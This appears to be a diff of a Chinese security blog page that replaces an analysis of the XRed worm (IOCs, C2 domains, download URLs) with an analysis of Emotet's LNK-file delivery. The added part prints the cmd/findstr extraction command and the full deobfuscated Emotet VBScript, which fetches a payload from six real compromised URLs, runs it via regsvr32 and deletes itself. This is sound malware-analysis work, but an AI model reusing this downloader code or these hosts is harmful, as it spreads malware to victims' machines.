@@ -16,34 +16,25 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、样本信息恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：    文件名 000000.xlsm    MD5 e566fc53051035e1e6fd0ed1823de0f9   SHA256 8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bb">
+    <meta name="description" content="今天发现Emotet出现了新的攻击方式 第一次接触Emotet是采用的常见的Office宏病毒，然后升级到后来的宏4.0，现在又出现了新的攻击方式——利用LInk文件进行攻击。 搜集到的样本包括Link文件生成VBS和PowerShell两种，以生成VBS文件为例。 文件名：Datos-2504.lnk MD5: 95e0286c6c38320d9673b6492f9e2284   1C:\Win">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XRed蠕虫病毒分析">
-<meta property="og:url" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="Emotet的新形式-Link">
+<meta property="og:url" content="http://example.com/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/index.html">
 <meta property="og:site_name" content="Demo">
-<meta property="og:description" content="一、样本信息恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：    文件名 000000.xlsm    MD5 e566fc53051035e1e6fd0ed1823de0f9   SHA256 8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bb">
+<meta property="og:description" content="今天发现Emotet出现了新的攻击方式 第一次接触Emotet是采用的常见的Office宏病毒，然后升级到后来的宏4.0，现在又出现了新的攻击方式——利用LInk文件进行攻击。 搜集到的样本包括Link文件生成VBS和PowerShell两种，以生成VBS文件为例。 文件名：Datos-2504.lnk MD5: 95e0286c6c38320d9673b6492f9e2284   1C:\Win">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image004.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image006.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image008.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image010.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image012.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image014.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image016.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image017.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image019.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image021.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image022.png">
-<meta property="article:published_time" content="2022-05-16T06:26:25.000Z">
-<meta property="article:modified_time" content="2022-05-16T06:31:26.806Z">
+<meta property="og:image" content="http://example.com/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/image-20220517144528337.png">
+<meta property="og:image" content="http://example.com/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/image-20220517145225085.png">
+<meta property="og:image" content="http://example.com/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/image-20220517145700961.png">
+<meta property="article:published_time" content="2022-05-17T07:18:48.000Z">
+<meta property="article:modified_time" content="2022-05-17T07:21:03.733Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="XRed">
+<meta property="article:tag" content="Emotet">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png">
+<meta name="twitter:image" content="http://example.com/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/image-20220517144528337.png">
   
   
-  <title>XRed蠕虫病毒分析 - Demo</title>
+  <title>Emotet的新形式-Link - Demo</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -201,7 +192,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="XRed蠕虫病毒分析">
+            <span class="h2" id="subtitle" title="Emotet的新形式-Link">
               
             </span>
 
@@ -211,8 +202,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-05-16 14:26" pubdate>
-        2022年5月16日 下午
+      <time datetime="2022-05-17 15:18" pubdate>
+        2022年5月17日 下午
       </time>
     </span>
   
@@ -222,7 +213,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.1k 字
+      2.7k 字
     </span>
   
 
@@ -231,7 +222,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18 分钟
+      23 分钟
     </span>
   
 
@@ -260,118 +251,34 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">XRed蠕虫病毒分析</h1>
+            <h1 style="display: none">Emotet的新形式-Link</h1>
             
             <div class="markdown-body">
-              <h2 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h2><p>恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：</p>
-<table>
-<thead>
-<tr>
-<th>文件名</th>
-<th>000000.xlsm</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MD5</td>
-<td>e566fc53051035e1e6fd0ed1823de0f9</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bbfb731424d7952c15</td>
-</tr>
-<tr>
-<td>文件大小</td>
-<td>18,387 字节</td>
-</tr>
-<tr>
-<td>病毒类型</td>
-<td>HEUR:Trojan-Downloader.Script.Generic</td>
-</tr>
-</tbody></table>
-<p>经初步分析该文档属于伪装成“Synaptics触摸板驱动程序”的Xred蠕虫病毒产生的存在恶意宏代码的Excel传播文档。该病毒曾于2020年初较为活跃，是具备远程控制、信息窃取能力的感染型病毒，可以感染本地EXE文件及xlsx电子表格文件，病毒可通过文件分享和U盘、移动硬盘等媒介传播。据此，安全人员判定上述上传恶意文件的主机已经遭受感染，但在流量监控过程中并未发现该病毒主程序，因此从相关威胁情报中搜集到了源EXE格式病毒。Xred病毒详情如下：</p>
-<table>
-<thead>
-<tr>
-<th>文件名</th>
-<th>Synaptics.exe</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MD5</td>
-<td>13358cfb6040fd4b2dba262f209464de</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>72daa031ce52468fce5cdab85b21b18f1211b8804bc23c6e6ae8c24e868c4866</td>
-</tr>
-<tr>
-<td>文件大小</td>
-<td>771,584 字节</td>
-</tr>
-<tr>
-<td>病毒类型</td>
-<td>Backdoor.Win32.DarkKomet.hqxy</td>
-</tr>
-</tbody></table>
-<h2 id="二、样本分析"><a href="#二、样本分析" class="headerlink" title="二、样本分析"></a>二、样本分析</h2><p>捕获的Excel文档内容均为空，包含恶意宏代码，打开后会自动运行。篡改Word和Excel组件的宏设置，启用所有宏，并通过公有云盘下载并执行Synaptics.exe病毒。目前所有的下载链接均已失效。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>修改宏设置</center>
+              <p>今天发现Emotet出现了新的攻击方式</p>
+<p>第一次接触Emotet是采用的常见的Office宏病毒，然后升级到后来的宏4.0，现在又出现了新的攻击方式——利用LInk文件进行攻击。</p>
+<p>搜集到的样本包括Link文件生成VBS和PowerShell两种，以生成VBS文件为例。</p>
+<p><strong>文件名：Datos-2504.lnk</strong></p>
+<p><strong>MD5: 95e0286c6c38320d9673b6492f9e2284</strong></p>
+<img src="image-20220517144528337.png" srcset="/img/loading.gif" lazyload alt="image-20220517144528337" style="zoom:67%;" />
 
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image004.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>远程下载并执行病毒</center>
+<figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">C:\Windows\system32\cmd.exe <span class="hljs-regexp">/v:on /</span>c findstr <span class="hljs-string">&quot;glKmfOKnQLYKnNs.*&quot;</span> <span class="hljs-string">&quot;Datos-2504.lnk&quot;</span>                                                                                                                         &gt; <span class="hljs-string">&quot;%tmp%\YlScZcZKeP.vbs&quot;</span> &amp; <span class="hljs-string">&quot;%tmp%\YlScZcZKeP.vbs&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>Xred病毒由Delph编写，无壳，自身伪装成Synaptics触摸板驱动程序。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image006.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>PE详情</center>
+<p>启动CMD调用findstr在文件内搜索以”glKmfOKnQLYKnNs.*”开头的字符串保存到”%tmp%\YlScZcZKeP.vbs”下，并执行。</p>
+<p>Link文件本身包含VBS脚本。</p>
+<img src="image-20220517145225085.png" srcset="/img/loading.gif" lazyload alt="image-20220517145225085" style="zoom: 67%;" />
 
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image008.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>伪装成驱动程序</center>
+<p>生成的YlScZcZKeP.vbs经过混淆。</p>
+<img src="image-20220517145700961.png" srcset="/img/loading.gif" lazyload alt="image-20220517145700961" style="zoom:80%;" />
 
-<p>该病毒通过感染指定位置（Desktop、Documents、Downloads）的32位的“.exe”后缀文件与“.xlsx”后缀文件，使其恶意代码可以通过文件共享大量传播但不会导致系统明显卡顿。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image010.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>指定位置</center>
+<p>通过手工和WScript.StdOut.WriteLine方法去混淆得到可读代码。</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">on</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br><span class="hljs-keyword">Set</span> FSO = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><br><span class="hljs-keyword">Function</span> Base64Decode(<span class="hljs-keyword">ByVal</span> vCode)<br>    <span class="hljs-keyword">With</span> <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.DOMDocument.3.0&quot;</span>).CreateElement(<span class="hljs-string">&quot;base64&quot;</span>)<br>        .dataType = <span class="hljs-string">&quot;bin.base64&quot;</span><br>        .text = vCode<br>        Base64Decode = Stream_BinaryTo<span class="hljs-built_in">String</span>(.nodeTypedValue)<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Function</span> Stream_BinaryTo<span class="hljs-built_in">String</span>(Binary)<br>    <span class="hljs-keyword">With</span> <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>        .Type = <span class="hljs-number">1</span><br>        .Open<br>        .Write Binary<br>        .Position = <span class="hljs-number">0</span><br>        .Type = <span class="hljs-number">2</span><br>        .CharSet = <span class="hljs-string">&quot;utf-8&quot;</span><br>        Stream_BinaryToString = .ReadText<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Dim</span> LmPxinnpsd(<span class="hljs-number">6</span>)<br><br><br>LmPxinnpsd(<span class="hljs-number">0</span>) = <span class="hljs-string">&quot;https://creemo.pl/wp-admin/ZKS1DcdquUT4Bb8Kb/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">1</span>) = <span class="hljs-string">&quot;http://filmmogzivota.rs/SpryAssets/gDR/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">2</span>) = <span class="hljs-string">&quot;http://demo34.ckg.hk/service/hhMZrfC7Mnm9JD/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">3</span>) = <span class="hljs-string">&quot;http://focusmedica.in/fmlib/IxBABMh0I2cLM3qq1GVv/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">4</span>) = <span class="hljs-string">&quot;http://cipro.mx/prensa/siZP69rBFmibDvuTP1L/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">5</span>) = <span class="hljs-string">&quot;http://colegiounamuno.es/cgi-bin/E/&quot;</span><br><br><br><span class="hljs-keyword">Execute</span>(<span class="hljs-string">&quot;dIm xml,Ws,Db,FiLePaTH,uRL</span><br><span class="hljs-string">xml = &quot;</span>MSXml2.SeRVERXmlhtTp<span class="hljs-number">.3</span><span class="hljs-number">.0</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">Ws = &quot;</span>wscRipT.SHEll<span class="hljs-string">&quot;</span><br><span class="hljs-string">Db = &quot;</span>aDodb.STReam<span class="hljs-string">&quot;</span><br><span class="hljs-string">seT ImSHdnYdVR = CreAteOBjecT(ws)</span><br><span class="hljs-string">TmP = imsHdnydvR.EXpANdeNvIroNmEnTSTrIngS(&quot;</span>%tmp%<span class="hljs-string">&quot;)</span><br><span class="hljs-string">wiNDiR = iMshDnYdvR.ExPAndenviroNmEnTstRiNgs(&quot;</span>%wInDiR%<span class="hljs-string">&quot;) </span><br><span class="hljs-string"></span><br><span class="hljs-string">FilEPATH = tMp &amp; &quot;</span>\KzcEXkekpr.Zvp<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">CaLl prog</span><br><span class="hljs-string"> SUb PROG</span><br><span class="hljs-string">    ranDOmize</span><br><span class="hljs-string">    INDeX = iNT((5 - 0 + 1)*rnD + 0)</span><br><span class="hljs-string">    DiM msXML</span><br><span class="hljs-string">	seT mSxML = CreateOBJEcT(xmL)</span><br><span class="hljs-string">    dIM STreAM</span><br><span class="hljs-string">	sEt stream = crEaTEOBjECT(DB)</span><br><span class="hljs-string">    MsxML.oPEN &quot;</span><span class="hljs-keyword">GEt</span><span class="hljs-string">&quot;, BasE64Decode(lmPxInNpsd(iNdEX)), FAlse</span><br><span class="hljs-string">	msXML.sETReQueStheadEr &quot;</span>uSer-AgeNT<span class="hljs-string">&quot;, &quot;</span>vBKbaQgjyvRRbcgfvlsc<span class="hljs-string">&quot;</span><br><span class="hljs-string">	msxML.SEnd</span><br><span class="hljs-string">    wiTH stream</span><br><span class="hljs-string">	.TYPe = 1</span><br><span class="hljs-string">	.OpEN</span><br><span class="hljs-string">	.write MsXMl.rEspoNsEBody</span><br><span class="hljs-string">	.savetOfIlE fILEPATH, 2</span><br><span class="hljs-string">    end WitH</span><br><span class="hljs-string"> end Sub&quot;</span>)<br><br>ImshDnydVr.Exec(windir &amp; <span class="hljs-string">&quot;\sySTem32\regsVR32.Exe &quot;</span> &amp; tmp &amp; Base64Decode(<span class="hljs-string">&quot;XEtaY0VYa0VrcFIuWlZQ&quot;</span>))<br>FSO.GetFile(WScript.ScriptFullName).delete<br></code></pre></td></tr></table></figure>
 
-<p>被感染的文件被执行时，会执行恶意逻辑，包括释放伪装名为“Synaptics.exe”的文件常驻系统，进行远程控制，回传窃取的敏感信息等恶意行为。主要功能逻辑如下图所示：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image012.png" srcset="/img/loading.gif" lazyload alt="https://pc1.gtimg.com/guanjia/images/9b/83/9b837e056017f499ccb79ef4daa6213d.png"></p>
-<center>主要功能逻辑</center>
-
-<p>被感染的可执行文件体积增量约为753KB，包含一个名为“EXERESX”的资源，该资源是原始正常的程序。“EXERESX”资源会在宿主文件运行时被释放到当前目录并设置隐藏属性后执行。添加“ ._cache_”前缀拼接文件名。如下图所示：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image014.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image016.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>被感染的文件与原文件对比</center>
-
-<p>该病毒释放并加载名为“KBHKS”的动态库资源，通过设置相关钩子消息以记录键盘输入信息及其窗口信息等， Hook代码关键逻辑如下：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image017.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>Hook钩子</center>
-
-<p>病毒使用“XLSM”资源感染xlsx后缀文件，并将“.xlsx”后缀改为“.xlsm”。修改office组件设置以及xlsm后缀目的为了能够自动静默启用宏。如下图所示：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image019.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>感染xlsx文件</center>
-
-<p>病毒回连地址，公有云盘下载地址及敏感信息接收邮箱见下图：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image021.png" srcset="/img/loading.gif" lazyload alt="img"> <center>回连字符串</center></p>
-<p>具有基础的远程控制功能，包括执行CMD命令、屏幕截图、打印目录、下载文件、删除文件等。功能代码如下图所示。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image022.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>远控功能</center>
-
-
-
-<h2 id="三、IOCs"><a href="#三、IOCs" class="headerlink" title="三、IOCs"></a>三、IOCs</h2><p><strong>MD5：</strong></p>
-<p>e566fc53051035e1e6fd0ed1823de0f9</p>
-<p>13358cfb6040fd4b2dba262f209464de</p>
-<p>备注：因为被感染文件一直都是变化的，MD5值不确定，只列举了两个得到的样本</p>
-<p><strong>C2 &amp; URL：</strong></p>
-<p>xred.mooo.com</p>
-<p>freedns.afraid.org</p>
-<p>docs.google.com&#x2F;uc?id&#x3D;0BxsMXGfPIZfSVlVsOGlEVGxuZVk&amp;export&#x3D;download</p>
-<p><a target="_blank" rel="noopener" href="http://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1">www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1</a></p>
-<p>xred.site50.net&#x2F;syn&#x2F;Synaptics.rar</p>
-<p><strong>邮箱地址：</strong></p>
-<p><a href="mailto:&#x78;&#x72;&#101;&#100;&#x6c;&#105;&#110;&#101;&#x31;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#x78;&#x72;&#101;&#100;&#x6c;&#105;&#110;&#101;&#x31;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;</a></p>
-<p><a href="mailto:&#x78;&#114;&#101;&#100;&#108;&#x69;&#110;&#x65;&#x32;&#x40;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;">&#x78;&#114;&#101;&#100;&#108;&#x69;&#110;&#x65;&#x32;&#x40;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;</a></p>
-<p><a href="mailto:&#120;&#114;&#101;&#x64;&#x6c;&#x69;&#110;&#x65;&#x33;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#120;&#114;&#101;&#x64;&#x6c;&#x69;&#110;&#x65;&#x33;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a></p>
-<h2 id="四、处置建议"><a href="#四、处置建议" class="headerlink" title="四、处置建议"></a>四、处置建议</h2><p>（1）立即对感染病毒的机器进行断网处理，避免进一步扩散。</p>
-<p>（2）对已感染病毒的电脑，进行全盘查杀，修复被感染的文件。</p>
+<p>和之前的VBA宏病毒样本一样都是从多个地址下载远控木马，然后通过regsvr32执行。</p>
+<p><strong>参考：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.cyble.com/2022/04/27/emotet-returns-with-new-ttps-and-delivers-lnk-files-to-its-victims/">https://blog.cyble.com/2022/04/27/emotet-returns-with-new-ttps-and-delivers-lnk-files-to-its-victims/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/emotet-malware-now-installs-via-powershell-in-windows-shortcut-files/">https://www.bleepingcomputer.com/news/security/emotet-malware-now-installs-via-powershell-in-windows-shortcut-files/</a></p>
+<p>对Link文件病毒感兴趣的可以参考这篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-260953.htm">https://bbs.pediy.com/thread-260953.htm</a></p>
 
             </div>
             <hr>
@@ -389,7 +296,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/XRed/">XRed</a>
+                      <a class="hover-with-bg" href="/tags/Emotet/">Emotet</a>
                     
                   </div>
                 
@@ -406,18 +313,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Emotet的新形式-Link</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/13/VBE%E3%80%81PowerShell%E5%92%8CJavaScript%E6%9C%A8%E9%A9%AC/">
-                        <span class="hidden-mobile">VBE、PowerShell和JavaScript木马</span>
+                      <a href="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">XRed蠕虫病毒分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
